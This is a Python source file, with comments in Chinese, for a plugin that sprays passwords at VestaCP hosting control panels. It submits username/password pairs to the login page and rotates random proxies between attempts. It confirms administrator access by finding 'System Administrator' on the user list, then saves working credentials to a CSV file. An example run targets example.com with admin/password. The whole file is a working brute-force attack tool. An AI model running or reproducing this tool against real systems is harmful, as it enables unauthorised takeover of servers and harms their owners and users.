#!/usr/bin/env python
# vestacp_plugin.py (修正版)
# VestaCP 密碼噴灑插件

import logging
import requests
import csv
import os
import random
from datetime import datetime
from threading import Lock
import re

requests.packages.urllib3.disable_warnings()

class VestaCPBruteForcePlugin:
    """VestaCP 密碼噴灑插件"""

    def __init__(self, threads=5, timeout=10, debug=False, proxy=None, proxy_pool=None, logger=None):
        self.threads = threads
        self.timeout = timeout
        self.debug = debug
        self.lock = Lock()
        self.session = requests.Session()
        self.session.verify = False
        self.proxy = proxy
        self.proxy_pool = proxy_pool or []
        self.logger = logger or self.setup_logger()
        if proxy:
            self.session.proxies.update({'http': proxy, 'https': proxy})

    def setup_logger(self):
        logger = logging.getLogger("vestacp")
        logger.setLevel(logging.DEBUG if self.debug else logging.INFO)
        if logger.hasHandlers():
            logger.handlers.clear()
        formatter = logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s',
            '%Y-%m-%d %H:%M:%S')
        fh = logging.FileHandler(os.path.join("logs", f"vestacp_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"), encoding='utf-8')
        fh.setFormatter(formatter)
        ch = logging.StreamHandler()
        ch.setFormatter(formatter)
        logger.addHandler(fh)
        logger.addHandler(ch)
        return logger

    def determine_protocol(self, host, port):
        """
        確定 VestaCP 的通訊協議，並確認指定的連接埠是否可用。
        """
        for protocol in ["https", "http"]:
            url = f"{protocol}://{host}:{port}"
            try:
                resp = self.session.get(url, timeout=self.timeout, allow_redirects=False)
                if resp.status_code < 400:
                    return protocol
            except requests.RequestException:
                continue
        return "https"

    def attempt_login(self, target, port, username, password):
        """
        執行 VestaCP 登入嘗試。
        """
        self.session.cookies.clear()
        protocol = self.determine_protocol(target, port)
        base_url = f"{protocol}://{target}:{port}"

        login_url = f"{base_url}/login/"
        try:
            resp_get = self.session.get(login_url, timeout=self.timeout, allow_redirects=False)
            if resp_get.status_code != 200:
                return False, f"GET /login/ failed: {resp_get.status_code}"
        except requests.RequestException as e:
            return False, f"GET /login/ exception: {e}"

        data = {'user': username, 'password': password}
        try:
            resp_post = self.session.post(login_url, data=data, timeout=self.timeout, allow_redirects=False)
        except requests.RequestException as e:
            return False, f"POST /login/ exception: {e}"

        if resp_post.status_code == 302 and resp_post.headers.get("Location") == "/":
            try:
                resp_home = self.session.get(f"{base_url}/", timeout=self.timeout, allow_redirects=False)
                if resp_home.status_code == 302 and resp_home.headers.get("Location") == "/list/user/":
                    resp_list = self.session.get(f"{base_url}/list/user/", timeout=self.timeout)
                    if "System Administrator" in resp_list.text:
                        return True, str(resp_list.status_code)
                    return False, "Login failed: keyword not found"
                return False, f"Unexpected redirect after login: {resp_home.status_code}"
            except requests.RequestException as e:
                return False, f"GET after login exception: {e}"
        elif resp_post.status_code == 200 and "Invalid username or password" in resp_post.text:
            return False, "Invalid credentials"
        return False, f"Unexpected status {resp_post.status_code}"

    def write_success_csv(self, file_path, target, port, username, password):
        with self.lock:
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            write_header = not os.path.exists(file_path) or os.path.getsize(file_path) == 0
            with open(file_path, 'a', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=["Target", "Port", "Username", "Password", "Status"])
                if write_header:
                    writer.writeheader()
                writer.writerow({
                    "Target": target,
                    "Port": port,
                    "Username": username,
                    "Password": password,
                    "Status": "Success"
                })

    def write_failure_csv(self, file_path, target, port, username, password, response_code, failure_reason):
        with self.lock:
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            write_header = not os.path.exists(file_path) or os.path.getsize(file_path) == 0
            with open(file_path, 'a', newline='', encoding='utf-8') as f:
                writer = csv.DictWriter(f, fieldnames=["Target", "Port", "Username", "Password", "ResponseCode", "FailureReason"])
                if write_header:
                    writer.writeheader()
                writer.writerow({
                    "Target": target,
                    "Port": port,
                    "Username": username,
                    "Password": password,
                    "ResponseCode": response_code,
                    "FailureReason": failure_reason
                })

    def process_login(self, target, port, username, password, output_file, failed_log, timeout, retries):
        # 每次嘗試前更新 proxy
        if self.proxy_pool:
            p = random.choice(self.proxy_pool)
            self.session.proxies.update({'http': p, 'https': p})
        elif self.proxy:
            self.session.proxies.update({'http': self.proxy, 'https': self.proxy})

        original_timeout = self.timeout
        self.timeout = timeout

        success = False
        msg = ""
        for attempt in range(1, int(retries) + 1):
            self.logger.debug(f"Attempt {attempt}/{retries} - {target}:{port} ({username}/{password})")
            success, msg = self.attempt_login(target, port, username, password)
            if success:
                msg = f"Success on attempt {attempt}"
                break

        if success:
            self.logger.info(f"✅ 成功: {target}:{port} - {username}/{password} | {msg}")
            self.write_success_csv(output_file, target, port, username, password)
        elif failed_log:
            code_match = re.search(r'\b\d{3}\b', msg)
            code = code_match.group() if code_match else ""
            self.logger.warning(f"❌ 失敗: {target}:{port} - {username}/{password} | {msg}")
            self.write_failure_csv(failed_log, target, port, username, password, code, msg)

        self.timeout = original_timeout

# 獨立執行範例
if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
    plugin = VestaCPBruteForcePlugin(threads=5, timeout=10, debug=True, proxy="http://127.0.0.1:8080")
    plugin.process_login(
        target="example.com",
        port=8083,
        username="admin",
        password="password",
        output_file="vestacp_success.csv",
        failed_log="vestacp_failed.csv",
        timeout=5,
        retries=3
    )

